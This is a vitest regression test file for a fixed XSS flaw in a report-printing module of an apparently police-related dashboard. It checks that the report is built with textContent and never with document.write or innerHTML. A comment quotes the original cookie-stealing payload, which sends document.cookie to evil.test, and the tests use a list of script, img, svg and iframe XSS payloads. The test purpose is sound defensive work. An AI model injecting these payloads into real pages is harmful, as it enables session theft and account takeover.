import { describe, it, expect, beforeEach, vi } from "vitest";
import { openReport } from "@/lib/report";

// FINDING-02 regression, carried since the Phase 1 audit.
//
// Both v1 print paths interpolated analyst-authored fields into an HTML string
// and passed it to document.write(). A case titled
//   <img src=x onerror="fetch('https://evil.test/'+document.cookie)">
// executed on the same origin as the officer's session. Verified reproducible
// before the rewrite.
//
// These tests assert the property that makes it impossible: the report is built
// from DOM nodes via textContent, so a payload lands as literal text.

const XSS = [
  '<img src=x onerror="alert(1)">',
  "</td></tr><script>fetch('https://evil.test')</script>",
  "<svg/onload=alert(1)>",
  '"><iframe src=javascript:alert(1)>',
  "javascript:alert(document.domain)",
];

function fakeWindow() {
  const doc = document.implementation.createHTMLDocument("");
  return {
    document: doc,
    setTimeout: (fn: () => void) => fn(),
    print: vi.fn(),
  } as unknown as Window;
}

let win: Window;
beforeEach(() => {
  win = fakeWindow();
  vi.spyOn(window, "open").mockReturnValue(win);
});

describe("no source file calls document.write", () => {
  it("neither print path uses document.write any more", async () => {
    const fs = await import("fs");
    for (const f of [
      "components/dashboard/RecordsModal.tsx",
      "components/dashboard/panels/AlertLog.tsx",
      "lib/report.ts",
    ]) {
      const src = fs.readFileSync(f, "utf8");
      // Allow the word inside an explanatory comment, not as a call.
      expect(src).not.toMatch(/\.document\.write\s*\(/);
    }
  });

  it("the report builder never ASSIGNS innerHTML", async () => {
    const fs = await import("fs");
    const src = fs.readFileSync("lib/report.ts", "utf8");
    // Match an actual property write, not the word in a comment. The first
    // version of this test failed on its own documentation, the same way the
    // CI .onion guardrail matched the tests that prove the rule holds.
    expect(src).not.toMatch(/\.innerHTML\s*=/);
    expect(src).not.toMatch(/insertAdjacentHTML/);
    // And the safe primitive must actually be in use.
    expect(src).toMatch(/textContent\s*=/);
  });
});

describe("openReport escapes by construction", () => {
  it.each(XSS)("renders %s as literal text, not markup", (payload) => {
    openReport({
      title: "T",
      subtitle: "S",
      columns: [{ header: "Title", value: (r: { t: string }) => r.t }],
      rows: [{ t: payload }],
    });
    const doc = win.document;
    // The payload is present as TEXT...
    expect(doc.body.textContent).toContain(payload);
    // ...and produced no elements of its own.
    expect(doc.querySelectorAll("script").length).toBe(0);
    expect(doc.querySelectorAll("img, svg, iframe").length).toBe(0);
  });

  it("escapes a hostile header too", () => {
    openReport({
      title: "T",
      subtitle: "S",
      columns: [{ header: "<script>alert(1)</script>", value: () => "x" }],
      rows: [{}],
    });
    expect(win.document.querySelectorAll("script").length).toBe(0);
  });

  it("escapes a hostile title and subtitle", () => {
    openReport({
      title: "<script>t</script>",
      subtitle: "<img src=x onerror=alert(1)>",
      columns: [{ header: "A", value: () => "b" }],
      rows: [{}],
    });
    expect(win.document.querySelectorAll("script, img").length).toBe(0);
  });

  it("generates no inline script at all", () => {
    openReport({
      title: "T", subtitle: "S",
      columns: [{ header: "A", value: () => "b" }],
      rows: [{}],
    });
    expect(win.document.querySelectorAll("script").length).toBe(0);
  });
});

describe("openReport still produces a usable report", () => {
  it("renders headers and every row", () => {
    openReport({
      title: "Case Report",
      subtitle: "MP Cyber Cell",
      columns: [
        { header: "ID", value: (r: { id: string; city: string }) => r.id },
        { header: "City", value: (r: { id: string; city: string }) => r.city },
      ],
      rows: [
        { id: "CASE-1", city: "Jabalpur" },
        { id: "CASE-2", city: "Katni" },
      ],
    });
    const doc = win.document;
    expect(doc.querySelectorAll("th")).toHaveLength(2);
    expect(doc.querySelectorAll("tbody tr")).toHaveLength(2);
    expect(doc.body.textContent).toContain("Jabalpur");
    expect(doc.body.textContent).toContain("Katni");
  });

  it("shows an empty message with a spanning cell", () => {
    openReport({
      title: "T", subtitle: "S",
      columns: [{ header: "A", value: () => "" }, { header: "B", value: () => "" }],
      rows: [],
      emptyMessage: "No records",
    });
    const td = win.document.querySelector("tbody td") as HTMLTableCellElement;
    expect(td.textContent).toBe("No records");
    expect(td.colSpan).toBe(2);
  });

  it("returns false when the browser blocks the window", () => {
    vi.spyOn(window, "open").mockReturnValue(null);
    const ok = openReport({
      title: "T", subtitle: "S",
      columns: [{ header: "A", value: () => "b" }], rows: [{}],
    });
    expect(ok).toBe(false);
  });
});
